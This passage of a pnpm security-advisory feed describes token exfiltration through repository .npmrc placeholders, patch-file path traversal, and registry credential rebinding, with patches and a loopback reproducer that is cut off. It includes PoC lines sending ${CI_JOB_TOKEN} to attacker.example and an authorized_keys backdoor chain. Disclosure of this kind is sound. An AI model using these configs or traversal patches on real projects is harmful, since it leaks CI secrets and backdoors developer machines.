<li><code>config/reader/src/index.ts</code> merged those expanded registry/auth values into <code>pnpmConfig.registries</code>, <code>pnpmConfig.authConfig</code>, and <code>pnpmConfig.configByUri</code>.</li>
<li><code>resolving/npm-resolver/src/fetch.ts</code> built metadata request URLs from the selected registry.</li>
<li><code>network/fetch/src/fetchFromRegistry.ts</code> dispatched the request and attached matching auth headers before install lifecycle scripts could run.</li>
</ul>
<p>The pacquet parity path was:</p>
<ul>
<li><code>pacquet/crates/config/src/npmrc_auth.rs</code> expanded project <code>.npmrc</code> placeholders while parsing registry URLs and auth values.</li>
<li><code>pacquet/crates/config/src/workspace_yaml.rs</code> expanded workspace registry placeholders.</li>
<li><code>pacquet/crates/resolving-npm-resolver/src/fetch_full_metadata.rs</code> used the configured registry URL and <code>AuthHeaders</code> for metadata fetches.</li>
</ul>
<h3 id="poc">PoC</h3>
<p>Repository <code>.npmrc</code> URL-path exfiltration:</p>
<pre><code class="language-ini">registry=https://attacker.example/${CI_JOB_TOKEN}/
</code></pre>
<p>Repository <code>.npmrc</code> auth-header exfiltration:</p>
<pre><code class="language-ini">registry=https://attacker.example/
//attacker.example/:_authToken=${CI_JOB_TOKEN}
</code></pre>
<p>Repository <code>pnpm-workspace.yaml</code> URL-path exfiltration:</p>
<pre><code class="language-yaml">registries:
  default: https://attacker.example/${CI_JOB_TOKEN}/
namedRegistries:
  work: https://attacker.example/${CI_JOB_TOKEN}/npm/
</code></pre>
<p>Exploit method:</p>
<ol>
<li>The victim checks out the repository and runs a pnpm or pacquet dependency-management command with <code>CI_JOB_TOKEN</code> or another sensitive environment variable present.</li>
<li>Before the patch, repository config expanded the placeholder to the victim secret.</li>
<li>The resolver used the expanded registry or matching auth entry to construct a metadata request.</li>
<li>The victim sent a request such as <code>https://attacker.example/&lt;secret&gt;/&lt;package&gt;</code> or <code>Authorization: Bearer &lt;secret&gt;</code> to the attacker-controlled endpoint.</li>
</ol>
<p>Validation PoC:</p>
<p>The PoC models the pre-patch URL and Authorization-header leaks, then verifies that patched pnpm and pacquet do not keep the secret in repository-controlled registry destinations or credential values.</p>
<h3 id="impact">Impact</h3>
<p>A malicious repository can disclose environment secrets present in a developer or CI process to a repository-selected registry before script controls apply. This can expose npm tokens, CI job tokens, OIDC helper inputs, or other conventional environment secrets if the attacker knows or guesses their names.</p>
<h2 id="affected-products">Affected Products</h2>
<p>Ecosystem: npm</p>
<p>Package name: <code>pnpm</code>, <code>@pnpm/config.reader</code>; pacquet Rust port</p>
<p>Affected versions: current main before this patch, when project <code>.npmrc</code> or <code>pnpm-workspace.yaml</code> contains environment placeholders in registry request destinations or project <code>.npmrc</code> contains environment placeholders in registry credential values.</p>
<p>Patched versions: pending release containing this patch.</p>
<h2 id="severity">Severity</h2>
<p>Severity before patch: High</p>
<p>Vector string before patch: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</code></p>
<p>Score before patch: 7.4</p>
<p>Severity after patch: None</p>
<p>Vector string after patch: not vulnerable after patch</p>
<p>Score after patch: 0.0</p>
<p>Rationale: exploitation is remote and low complexity once a victim runs pnpm or pacquet in the malicious repository. No attacker privileges are required, but user interaction is required. The demonstrated sink is secret disclosure through outbound registry requests, not arbitrary code execution, so confidentiality is high while integrity and availability are not directly impacted by this finding. After the patch, repository-controlled registry destinations and credential values containing env placeholders are ignored, while trusted user/global/auth.ini/CLI config still expands.</p>
<h2 id="weaknesses">Weaknesses</h2>
<p>CWE-201: Insertion of Sensitive Information Into Sent Data</p>
<p>CWE-200: Exposure of Sensitive Information to an Unauthorized Actor</p>
<p>CWE-522: Insufficiently Protected Credentials</p>
<h2 id="patch">Patch</h2>
<p>The patch makes environment expansion trust-aware for registry requests:</p>
<ul>
<li>Project <code>.npmrc</code> no longer expands <code>${...}</code> in <code>registry</code>, <code>@scope:registry</code>, proxy URL values, URL-scoped keys such as <code>//host/${SECRET}/:_authToken</code>, or registry credential values such as <code>//host/:_authToken=${SECRET}</code> and <code>_authToken=${SECRET}</code>.</li>
<li>User <code>.npmrc</code>, auth.ini, CLI, global, and environment config still support env expansion for trusted registry configuration.</li>
<li><code>pnpm-workspace.yaml</code> no longer expands <code>${...}</code> in <code>registry</code>, <code>registries</code>, or <code>namedRegistries</code> URL values.</li>
<li>Trusted user-level auth values such as <code>//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}</code> still expand or lossy-drop as before, preserving setup-node and OIDC trusted-publishing behavior when the <code>.npmrc</code> is supplied as user config.</li>
<li>Pacquet mirrors the same boundary with <code>from_project_ini()</code> for project <code>.npmrc</code> and workspace registry filtering.</li>
</ul>
<p>Changed files:</p>
<ul>
<li><code>config/reader/src/loadNpmrcFiles.ts</code></li>
<li><code>config/reader/src/getOptionsFromRootManifest.ts</code></li>
<li><code>config/reader/test/index.ts</code></li>
<li><code>config/reader/test/getOptionsFromRootManifest.test.ts</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth.rs</code></li>
<li><code>pacquet/crates/config/src/npmrc_auth/tests.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml.rs</code></li>
<li><code>pacquet/crates/config/src/workspace_yaml/tests.rs</code></li>
</ul>
<p>Changeset:</p>
<ul>
<li><code>.changeset/sharp-registry-env-placeholders.md</code></li>
</ul>
<p>Pacquet parity:</p>
<p>Ported in the same patch. Pacquet dependency-management commands now parse project <code>.npmrc</code> with request-destination and credential-value env expansion disabled, and drop workspace registry values containing <code>${...}</code> placeholders.</p>
<h2 id="verification">Verification</h2>
<p>Post-patch validation:</p>
<p>The PoC ran:</p>
<pre><code class="language-bash">./node_modules/.bin/tsgo --build config/reader/tsconfig.json
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/getOptionsFromRootManifest.test.ts --runInBand
NODE_OPTIONS="--experimental-vm-modules --disable-warning=ExperimentalWarning --disable-warning=DEP0169" ../../node_modules/.bin/jest test/index.ts -t "project \.npmrc does not expand env variables in registry URLs|project \.npmrc does not expand env variables in scoped registry URLs or URL-scoped keys|project \.npmrc does not expand env variables in auth values|user \.npmrc may expand env variables in registry URLs|drops the placeholder when the env var is unset|substitutes normally when the env var is set|only drops the unresolved placeholder|explicit .*undefined.* fallbacks|pnpm-workspace\.yaml registries do not expand env variables|return a warning when the \.npmrc has an env variable" --runInBand
./node_modules/.bin/eslint config/reader/src/loadNpmrcFiles.ts config/reader/src/getOptionsFromRootManifest.ts config/reader/test/index.ts config/reader/test/getOptionsFromRootManifest.test.ts
cargo fmt --manifest-path pacquet/crates/config/Cargo.toml --check
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_scoped_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_url_scoped_keys --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml project_ini_ignores_env_placeholders_in_auth_values --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml trusted_ini_expands_env_placeholders_in_registry_urls --lib
cargo test --manifest-path pacquet/crates/config/Cargo.toml ignores_env_vars_inside_workspace_registry_values --lib
git diff --check
</code></pre>
<p>Results:</p>
<ul>
<li>PoC pre-patch model showed <code>cand122-ci-job-token</code> in both a request URL and a bearer auth header.</li>
<li>TypeScript build for <code>config.reader</code>: passed.</li>
<li>Focused root-manifest tests: 8 passed, including workspace registry and named-registry placeholder denial.</li>
<li>Focused config-reader integration tests: 10 passed, covering project <code>.npmrc</code> default registry denial, scoped registry denial, URL-scoped-key denial, project auth-value denial, trusted user <code>.npmrc</code> registry expansion, trusted user auth-value expansion/lossy fallback, and workspace registry denial.</li>
<li><code>cargo fmt --check</code>: passed.</li>
<li>Focused pacquet tests: 6 passed, covering project <code>.npmrc</code> registry denial, scoped registry denial, URL-scoped-key denial, auth-value denial, trusted <code>.npmrc</code> registry expansion, and workspace YAML denial.</li>
<li><code>git diff --check</code>: passed.</li>
</ul>
<h2 id="cvss-reassessment">CVSS Reassessment</h2>
<p>The initial scan score used a repository-code-execution vector:</p>
<p><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code> (8.8 High)</p>
<p>The PoC and source trace showed this finding is direct secret disclosure through registry request URLs or Authorization headers, not a code execution path. The corrected vulnerable vector is:</p>
<p><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</code></p>
<p>Corrected vulnerable score: 7.4 High.</p>
<p>Final score after patch: 0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r">https://github.com/pnpm/pnpm/security/advisories/GHSA-3qhv-2rgh-x77r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55180">https://nvd.nist.gov/vuln/detail/CVE-2026-55180</a></li>
<li><a href="https://github.com/advisories/GHSA-3qhv-2rgh-x77r">https://github.com/advisories/GHSA-3qhv-2rgh-x77r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3qhv-2rgh-x77r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-26T23:12:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm Vulnerable to Arbitrary File Write/Delete via Malicious Patch File (Path Traversal)]]></title>
        <id>https://github.com/advisories/GHSA-rxhj-4m44-96r4</id>
        <link href="https://github.com/advisories/GHSA-rxhj-4m44-96r4"/>
        <updated>2026-06-26T22:59:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm's patch application pipeline (<code>@pnpm/patch-package</code>) performs no path validation on file paths extracted from <code>.patch</code> files. An attacker who contributes a malicious patch file via a pull request can write attacker-controlled content to or delete arbitrary files on the filesystem during <code>pnpm install</code>, as the user running the install. The <code>diff --git</code> header paths containing <code>../../</code> sequences traverse out of the package directory, and the traversal is difficult to catch in code review because patch file diff headers are opaque to most reviewers.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>During <code>pnpm install</code>, when a <code>patchedDependencies</code> entry is present in <code>pnpm-workspace.yaml</code>, pnpm reads the referenced <code>.patch</code> file and applies it via the embedded <code>@pnpm/patch-package</code> library. The <code>applyPatchToDir</code> function at <code>patching/apply-patch/src/index.ts:12-13</code> calls <code>process.chdir(opts.patchedDir)</code>, setting the working directory to the installed package location deep inside <code>node_modules/.pnpm/</code>.</p>
<p>The patch parser at <code>@pnpm/patch-package/dist/patch/parse.js:88</code> extracts file paths from <code>diff --git a/(.*?) b/(.*?)</code> headers using a regex with no path sanitization. The <code>executeEffects</code> function in <code>apply.js</code> then operates on these unsanitized paths:</p>
<p><strong>File write</strong> (<code>apply.js:35-49</code>):</p>
<pre><code class="language-javascript">case 'file creation': {
  const eff = effect
  fs.ensureDirSync(dirname(eff.path))
  fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })
  break
}
</code></pre>
<p><strong>File delete</strong> (<code>apply.js:13-22</code>):</p>
<pre><code class="language-javascript">case 'file deletion': {
  const eff = effect
  // TODO: integrity checks
  if (!opts.dryRun) {
    fs.unlinkSync(eff.path)
  }
  break
}
</code></pre>
<p>A path like <code>../../../../../../../../../../home/user/.ssh/authorized_keys</code> in the patch header traverses out of the package directory to an arbitrary location.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-bash"># Write variant:
bash autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh
# Result: PASS -- /tmp/vuln6_pwned created with attacker-controlled content

# Delete variant:
bash autofyn_audit/exploits/vuln7_patch_traversal_delete/exploit.sh
# Result: PASS -- /tmp/vuln7_target deleted by malicious patch

# Combined chain (delete + replace SSH authorized_keys):
bash autofyn_audit/exploits/chain2_patch_ssh_backdoor/exploit.sh
# Result: PASS -- authorized_keys replaced with attacker's public key
</code></pre>
<h2 id="impact">Impact</h2>
<p>Arbitrary file write and delete as the user running <code>pnpm install</code>, limited to paths writable by that user. An attacker who submits a PR adding a <code>.patch</code> file and <code>patchedDependencies</code> config can target SSH authorized_keys, shell configuration, CI/CD files, or other writable files. Patch files may receive less review scrutiny than <code>package.json</code> changes because the <code>../</code> traversal sequences are in <code>diff --git</code> headers that look like patch metadata.</p>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Validate parsed patch file paths against the package root directory. Reject any path that resolves outside the patched package directory via <code>path.resolve</code> + prefix check. Alternatively, sanitize at parse time by rejecting paths containing <code>..</code> components in <code>parse.js</code>.</p>
<hr>
<blockquote>
<p>Discovered by <a href="https://github.com/SignalPilot-Labs/AutoFyn">AutoFyn</a>
Full audit report: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md">audit_report.md</a>
Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh">exploit.sh</a></p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-rxhj-4m44-96r4">https://github.com/pnpm/pnpm/security/advisories/GHSA-rxhj-4m44-96r4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50015">https://nvd.nist.gov/vuln/detail/CVE-2026-50015</a></li>
<li><a href="https://github.com/advisories/GHSA-rxhj-4m44-96r4">https://github.com/advisories/GHSA-rxhj-4m44-96r4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rxhj-4m44-96r4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T22:59:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm Vulnerable to Arbitrary File Write/Delete via Malicious Patch File (Path Traversal)]]></title>
        <id>https://github.com/advisories/GHSA-rxhj-4m44-96r4</id>
        <link href="https://github.com/advisories/GHSA-rxhj-4m44-96r4"/>
        <updated>2026-06-26T22:59:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm's patch application pipeline (<code>@pnpm/patch-package</code>) performs no path validation on file paths extracted from <code>.patch</code> files. An attacker who contributes a malicious patch file via a pull request can write attacker-controlled content to or delete arbitrary files on the filesystem during <code>pnpm install</code>, as the user running the install. The <code>diff --git</code> header paths containing <code>../../</code> sequences traverse out of the package directory, and the traversal is difficult to catch in code review because patch file diff headers are opaque to most reviewers.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<p>During <code>pnpm install</code>, when a <code>patchedDependencies</code> entry is present in <code>pnpm-workspace.yaml</code>, pnpm reads the referenced <code>.patch</code> file and applies it via the embedded <code>@pnpm/patch-package</code> library. The <code>applyPatchToDir</code> function at <code>patching/apply-patch/src/index.ts:12-13</code> calls <code>process.chdir(opts.patchedDir)</code>, setting the working directory to the installed package location deep inside <code>node_modules/.pnpm/</code>.</p>
<p>The patch parser at <code>@pnpm/patch-package/dist/patch/parse.js:88</code> extracts file paths from <code>diff --git a/(.*?) b/(.*?)</code> headers using a regex with no path sanitization. The <code>executeEffects</code> function in <code>apply.js</code> then operates on these unsanitized paths:</p>
<p><strong>File write</strong> (<code>apply.js:35-49</code>):</p>
<pre><code class="language-javascript">case 'file creation': {
  const eff = effect
  fs.ensureDirSync(dirname(eff.path))
  fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })
  break
}
</code></pre>
<p><strong>File delete</strong> (<code>apply.js:13-22</code>):</p>
<pre><code class="language-javascript">case 'file deletion': {
  const eff = effect
  // TODO: integrity checks
  if (!opts.dryRun) {
    fs.unlinkSync(eff.path)
  }
  break
}
</code></pre>
<p>A path like <code>../../../../../../../../../../home/user/.ssh/authorized_keys</code> in the patch header traverses out of the package directory to an arbitrary location.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-bash"># Write variant:
bash autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh
# Result: PASS -- /tmp/vuln6_pwned created with attacker-controlled content

# Delete variant:
bash autofyn_audit/exploits/vuln7_patch_traversal_delete/exploit.sh
# Result: PASS -- /tmp/vuln7_target deleted by malicious patch

# Combined chain (delete + replace SSH authorized_keys):
bash autofyn_audit/exploits/chain2_patch_ssh_backdoor/exploit.sh
# Result: PASS -- authorized_keys replaced with attacker's public key
</code></pre>
<h2 id="impact">Impact</h2>
<p>Arbitrary file write and delete as the user running <code>pnpm install</code>, limited to paths writable by that user. An attacker who submits a PR adding a <code>.patch</code> file and <code>patchedDependencies</code> config can target SSH authorized_keys, shell configuration, CI/CD files, or other writable files. Patch files may receive less review scrutiny than <code>package.json</code> changes because the <code>../</code> traversal sequences are in <code>diff --git</code> headers that look like patch metadata.</p>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Validate parsed patch file paths against the package root directory. Reject any path that resolves outside the patched package directory via <code>path.resolve</code> + prefix check. Alternatively, sanitize at parse time by rejecting paths containing <code>..</code> components in <code>parse.js</code>.</p>
<hr>
<blockquote>
<p>Discovered by <a href="https://github.com/SignalPilot-Labs/AutoFyn">AutoFyn</a>
Full audit report: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md">audit_report.md</a>
Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh">exploit.sh</a></p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-rxhj-4m44-96r4">https://github.com/pnpm/pnpm/security/advisories/GHSA-rxhj-4m44-96r4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50015">https://nvd.nist.gov/vuln/detail/CVE-2026-50015</a></li>
<li><a href="https://github.com/advisories/GHSA-rxhj-4m44-96r4">https://github.com/advisories/GHSA-rxhj-4m44-96r4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rxhj-4m44-96r4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-26T22:59:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm binds unscoped user-level npm auth credentials to a repository-selected registry]]></title>
        <id>https://github.com/advisories/GHSA-cjhr-43r9-cfmw</id>
        <link href="https://github.com/advisories/GHSA-cjhr-43r9-cfmw"/>
        <updated>2026-06-26T22:59:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>pnpm can send user-level unscoped npm authentication credentials to a registry chosen by a repository-local <code>.npmrc</code> file.</p>
<p>In the reproduced case, the user's npm config contains a default registry and an unscoped <code>_authToken</code>. The repository does not provide a token-bearing auth line. It only sets <code>registry=</code> to a different registry URL. During normal pnpm metadata/install workflows, pnpm binds the user-origin unscoped credential to the repository-selected registry and sends it as an <code>Authorization</code> header.</p>
<p>This was reproduced with fake credentials and loopback registries only. No third-party registry or real token was used.</p>
<h2 id="affected-behavior-observed">Affected Behavior Observed</h2>
<p>Observed affected:</p>
<ul>
<li>pnpm <code>10.33.2</code>: <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
<li>pnpm <code>11.1.3</code>: <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
<li>pnpm <code>11.2.1</code> (<code>next-11</code> dist tag at testing time): <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
<li>pnpm <code>11.1.3</code>: <code>pnpm view</code> also sends user-level unscoped <code>_authToken</code>, <code>_auth</code>, and <code>username</code> / <code>_password</code> credentials to the repository-selected registry in the local loopback replay.</li>
</ul>
<p>Control:</p>
<ul>
<li>npm <code>10.9.7</code> rejects the same unscoped user <code>_authToken</code> configuration with <code>ERR_INVALID_AUTH</code> and does not send an <code>Authorization</code> header to the  repository-selected registry.</li>
<li>URL-scoped registry token controls held in the local loopback replay: tokens scoped to the trusted registry URL were not sent to the attacker registry.</li>
</ul>
<h2 id="threat-model">Threat Model</h2>
<p>Victim:</p>
<ul>
<li>developer or CI job with user-level npm registry credentials configured;</li>
<li>runs <code>pnpm install</code>, <code>pnpm view</code>, or an equivalent pnpm metadata/restore command in a repository.</li>
</ul>
<p>Attacker:</p>
<ul>
<li>controls repository-local package manager configuration, such as <code>.npmrc</code>;</li>
<li>can set <code>registry=</code> to a registry endpoint they control;</li>
<li>does not need to provide a token-bearing auth line for the strong case.</li>
</ul>
<p>Boundary:</p>
<p>Credentials from a higher-trust user configuration should not be rebound to a lower-trust repository-selected registry unless the credential is explicitly scoped to that registry.</p>
<h2 id="minimal-reproduction">Minimal Reproduction</h2>
<p>The reproducer below starts two loopback HTTP registries:</p>
<ul>
<li>a trusted registry URL used in the isolated user <code>.npmrc</code>;</li>
<li>an attacker registry URL used in the repository-local <code>.npmrc</code>.</li>
</ul>
<p>The isolated user <code>.npmrc</code> contains:</p>
<pre><code class="language-ini">registry=&lt;trusted-loopback-registry&gt;
_authToken=PR166_FAKE_REGISTRY_TOKEN
</code></pre>
<p>The repository-local <code>.npmrc</code> contains:</p>
<pre><code class="language-ini">registry=&lt;attacker-loopback-registry&gt;
</code></pre>
<p>The repository <code>package.json</code> depends on a toy package served by the loopback registry. The script then runs:</p>
<pre><code class="language-text">pnpm install --ignore-scripts
npm install --ignore-scripts
</code></pre>
<h2 id="expected-safe-behavior">Expected Safe Behavior</h2>
<p>pnpm should not send the user-level unscoped <code>_authToken</code> to the repository-selected registry. A safe behavior would be to reject or ignore the unscoped credential in this lower-trust registry-rebinding situation and require the credential to be URL-scoped to the selected registry.</p>
<h2 id="observed-behavior">Observed Behavior</h2>
<p>pnpm <code>10.33.2</code>, pnpm <code>11.1.3</code>, and pnpm <code>11.2.1</code> send:</p>
<pre><code class="language-http">Authorization: Bearer PR166_FAKE_REGISTRY_TOKEN
</code></pre>
<p>to the attacker loopback registry during install. npm <code>10.9.7</code> rejects the same config and sends no <code>Authorization</code> header.</p>
<h2 id="security-impact">Security Impact</h2>
<p>This can disclose npm registry credentials from user-level configuration to a registry endpoint selected by an untrusted repository. The leak occurs before package lifecycle scripts run and does not depend on package code execution.</p>
<h2 id="non-claims">Non-Claims</h2>
<p>This report does not claim:</p>
<ul>
<li>remote code execution;</li>
<li>registry account compromise by itself;</li>
<li>leakage of URL-scoped tokens for a different registry;</li>
<li>npm CLI impact;</li>
<li>impact from a repository explicitly committing its own token-bearing auth
line.</li>
</ul>
<h2 id="source-level-notes">Source-Level Notes</h2>
<p>In pnpm's config/auth-header flow, unscoped/default credentials are parsed from the merged auth config and stored as default credentials. The auth-header logic then maps those default credentials to the effective default registry. Because repository-local <code>.npmrc</code> can change the effective default registry, higher-trust default credentials can be applied to a lower-trust registry choice.</p>
<h2 id="suggested-fix-direction">Suggested Fix Direction</h2>
<p>The conservative fix direction is to reject or contain unscoped/default auth credentials when a lower-trust workspace/repository config changes the default registry. A compatibility-preserving fix could track the source layer of both the default registry and the default credentials, then only bind default credentials to a registry selected by the same or higher-trust source. A stricter npm-compatible fix would reject unscoped auth and require URL-scoped
credentials.</p>
<p>This needs maintainer semantic review and compatibility control because some legacy workflows may intentionally rely on default/unscoped auth.</p>
<h2 id="runnable-reproducer">Runnable Reproducer</h2>
<p>Save the following as <code>repro.py</code> and run it with Python 3 in an environment with pnpm and npm available. To force a specific pnpm version through Corepack, set <code>PR166_PNPM_SPEC</code>, for example <code>PR166_PNPM_SPEC=11.2.1</code>.</p>
<pre><code class="language-python">import base64
import contextlib
import hashlib
import http.server
import io
import json
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
import threading
from pathlib import Path


"""Standalone loopback reproducer.

It creates only temporary directories and loopback HTTP servers. Cleanup is handled by TemporaryDirectory context managers and registry shutdown handlers; no persistent state is expected outside the package-manager cache directories inside the temporary home. Non-claims: this does not use real credentials, third-party registries, package scripts, or remote services. Failure paths return exit 1 or exit 2 through sys.exit(main()).
"""

TOKEN = "PR166_FAKE_REGISTRY_TOKEN"
PACKAGE_TGZ = None


class RegistryHandler(http.server.BaseHTTPRequestHandler):
    requests = []

    def do_GET(self):
        self.requests.append(
            {
                "method": self.command,
                "path": self.path,
                "authorization": self.headers.get("Authorization"),
            }
        )
        if self.path.endswith(".tgz"):
            payload = make_package_tgz()
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)
            return

        payload = make_package_tgz()
        body = json.dumps(
            {
                "name": "@private/probe",
                "dist-tags": {"latest": "1.0.0"},
                "versions": {
                    "1.0.0": {
                        "name": "@private/probe",
                        "version": "1.0.0",
                        "dist": {
                            "tarball": f"http://127.0.0.1:{self.server.server_port}/private/@private/probe/-/probe-1.0.0.tgz",
                            "shasum": hashlib.sha1(payload).hexdigest(),
                            "integrity": "sha512-"
                            + base64.b64encode(hashlib.sha512(payload).digest()).decode("ascii"),
                        },
                    }
                },
            }
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


@contextlib.contextmanager
def registry():
    handler = type("RecordingRegistryHandler", (RegistryHandler,), {"requests": []})
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server, handler.requests
    finally:
        server.shutdown()
        thread.join(timeout=5)
        server.server_close()


def make_package_tgz():
    global PACKAGE_TGZ
    if PACKAGE_TGZ is not None:
        return PACKAGE_TGZ
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w:gz") as tf:
        data = b'{"name":"@private/probe","version":"1.0.0"}\n'
        info = tarfile.TarInfo("package/package.json")
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    PACKAGE_TGZ = bio.getvalue()
    return PACKAGE_TGZ


def write_text(path, text):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8", newline="\n")


def run_install(tool, trusted_url, attacker_url):
    exe = shutil.which(tool)
    if exe is None:
        return {"tool": tool, "error": "missing"}
    cmd = [exe, "install", "--ignore-scripts"]
    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
        corepack = shutil.which("corepack")
        if corepack is None:
            return {"tool": tool, "error": "corepack missing"}
        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "install", "--ignore-scripts"]

    with tempfile.TemporaryDirectory(prefix=f"pr166-min-{tool}-") as td:
        root = Path(td)
        home = root / "home"
        project = root / "project"
        home.mkdir()
        project.mkdir()
        userconfig = home / ".npmrc"

        write_text(userconfig, f"registry={trusted_url}\n_authToken={TOKEN}\n")
        write_text(project / ".npmrc", f"registry={attacker_url}\n")
        write_text(
            project / "package.json",
            '{"name":"pr166-probe","version":"1.0.0","dependencies":{"@private/probe":"1.0.0"}}\n',
        )

        env = os.environ.copy()
        env.update(
            {
                "HOME": str(home),
                "USERPROFILE": str(home),
                "NPM_CONFIG_USERCONFIG": str(userconfig),
                "npm_config_userconfig": str(userconfig),
                "NPM_CONFIG_CACHE": str(home / "cache"),
                "npm_config_cache": str(home / "cache"),
                "NPM_CONFIG_STORE_DIR": str(home / "store"),
                "npm_config_store_dir": str(home / "store"),
                "XDG_CACHE_HOME": str(home / "xdg-cache"),
                "XDG_DATA_HOME": str(home / "xdg-data"),
                "NO_COLOR": "1",
            }
        )

        proc = subprocess.run(
            cmd,
            cwd=str(project),
            env=env,
            text=True,
            encoding="utf-8",
            errors="replace",
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60,
        )
        return {"tool": tool, "returncode": proc.returncode, "output_tail": proc.stdout[-2000:]}


def summarize(tool, result, attacker_requests):
    auth_hits = [r for r in attacker_requests if r.get("authorization")]
    return {
        "tool": tool,
        "result": result,
        "attacker_auth_hits": auth_hits,
        "attacker_request_count": len(attacker_requests),
    }


def tool_version(tool):
    exe = shutil.which(tool)
    if exe is None:
        return "missing"
    cmd = [exe, "--version"]
    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
        corepack = shutil.which("corepack")
        if corepack is None:
            return "corepack missing"
        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "--version"]
    proc = subprocess.run(
        cmd,
        text=True,
        encoding="utf-8",
        errors="replace",
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=20,
    )
    return proc.stdout.strip() or f"exit-{proc.returncode}"


def main():
    pnpm_version = tool_version("pnpm")
    npm_version = tool_version("npm")
    print(f"TARGET_VERSION=pnpm {pnpm_version}; npm {npm_version}")
    if pnpm_version == "missing" or npm_version == "missing":
        print("CHECK environment_has_pnpm_and_npm result=fail")
        return 1

    print("ENVIRONMENT_READY")
    overall = []
    with registry() as (trusted, _trusted_requests), registry() as (attacker, attacker_requests):
        trusted_url = f"http://127.0.0.1:{trusted.server_port}/private/"
        attacker_url = f"http://127.0.0.1:{attacker.server_port}/private/"

        before = len(attacker_requests)
        pnpm_result = run_install("pnpm", trusted_url, attacker_url)
        pnpm_summary = summarize("pnpm", pnpm_result, attacker_requests[before:])
        overall.append(pnpm_summary)

        before = len(attacker_requests)
        npm_result = run_install("npm", trusted_url, attacker_url)
        npm_summary = summarize("npm", npm_result, attacker_requests[before:])
